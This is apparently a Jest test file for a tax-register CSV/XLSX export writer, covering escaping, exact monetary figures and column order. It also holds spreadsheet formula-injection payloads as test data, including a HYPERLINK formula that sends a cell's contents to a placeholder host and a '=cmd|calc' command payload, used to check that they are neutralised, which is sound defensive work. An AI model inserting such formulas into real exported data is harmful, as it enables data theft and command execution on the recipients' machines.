import {
  cellText,
  csvCell,
  csvHeader,
  csvRow,
  writeXlsx,
} from '../src/platform/export/export-writer';
import type { GridColumn } from '../src/platform/grid/grid.model';

/**
 * Turning a register into a file.
 *
 * Plan reference: V2 section 6.8; ADR-007.
 *
 * Two properties matter more than the format:
 *
 *   1. **A cell never becomes a formula.** Taxpayer names and objection
 *      grounds are typed by people, some of whom are disputing the assessment
 *      being exported. A name beginning `=` is a live formula in the
 *      officer's spreadsheet.
 *
 *   2. **A monetary figure survives the trip exactly.** An export that does
 *      not tie back to the register is worse than no export, because it is
 *      quoted and believed.
 */

const columns: readonly GridColumn[] = [
  { key: 'caseNumber', label: 'Case', type: 'text' },
  { key: 'taxpayerName', label: 'Taxpayer', type: 'text' },
  { key: 'netPayable', label: 'Net payable', type: 'amount' },
];

describe('export writer', () => {
  describe('formula injection', () => {
    it.each(['=1+1', '+1', '-1', '@SUM(A1)'])('neutralises a cell beginning %s', (value) => {
      expect(csvCell(value).replace(/^"|"$/g, '')).toMatch(/^'/);
    });

    it('leaves an ordinary value alone', () => {
      expect(csvCell('Acme Trading Ltd')).toBe('Acme Trading Ltd');
    });

    /**
     * The realistic attack, and the reason a blocklist of characters is not
     * enough on its own: the payload is a plausible company name.
     */
    it('neutralises a formula disguised as a company name', () => {
      const hostile = '=HYPERLINK("http://example.invalid?x"&A1,"Acme Trading Ltd")';
      const written = csvCell(hostile);
      expect(written.startsWith(`"'`) || written.startsWith(`'`)).toBe(true);
    });
  });

  describe('CSV escaping', () => {
    it('quotes a value containing a comma', () => {
      expect(csvCell('Trading, Ltd')).toBe('"Trading, Ltd"');
    });

    it('doubles an embedded quote', () => {
      expect(csvCell('The "Acme" Group')).toBe('"The ""Acme"" Group"');
    });

    it('quotes a value containing a newline', () => {
      expect(csvCell('line one\nline two')).toBe('"line one\nline two"');
    });
  });

  describe('money', () => {
    it('writes an exact decimal unchanged', () => {
      expect(cellText('1234567.8900')).toBe('1234567.8900');
    });

    /**
     * 2^53 + 1. A figure no IEEE-754 double can hold, so if anything on the
     * path parsed it the last digit would change.
     */
    it('does not lose a figure larger than a double can represent', () => {
      expect(cellText('9007199254740993.00')).toBe('9007199254740993.00');
    });

    it('writes a negative amount unchanged', () => {
      expect(cellText('-40000.5000')).toBe('-40000.5000');
    });
  });

  describe('rows', () => {
    it('writes the configured labels as the header', () => {
      expect(csvHeader(columns)).toBe('Case,Taxpayer,Net payable');
    });

    it('writes columns in the configured order, not the row’s', () => {
      const row = { netPayable: '100.00', caseNumber: 'TA-1', taxpayerName: 'Acme' };
      expect(csvRow(columns, row)).toBe('TA-1,Acme,100.00');
    });

    it('writes an absent value as empty rather than as "undefined"', () => {
      expect(csvRow(columns, { caseNumber: 'TA-1' })).toBe('TA-1,,');
    });

    it('writes a null as empty', () => {
      expect(csvCell(null)).toBe('');
    });

    it('writes a date in ISO-8601, not in a locale', () => {
      expect(cellText(new Date('2026-04-05T00:00:00Z'))).toBe('2026-04-05T00:00:00.000Z');
    });
  });

  describe('workbook', () => {
    async function* batches(): AsyncGenerator<readonly Record<string, unknown>[]> {
      yield [
        { caseNumber: 'TA-1', taxpayerName: 'Acme', netPayable: '100.00' },
        { caseNumber: 'TA-2', taxpayerName: '=cmd|calc', netPayable: '9007199254740993.00' },
      ];
    }

    it('produces a workbook and counts the rows it wrote', async () => {
      const { body, rowCount } = await writeXlsx('REGISTER', columns, batches());
      expect(rowCount).toBe(2);
      // A .xlsx is a zip. Anything else here means the writer produced
      // something Excel will refuse to open.
      expect(body.subarray(0, 2).toString('latin1')).toBe('PK');
      expect(body.length).toBeGreaterThan(1000);
    });
  });
});
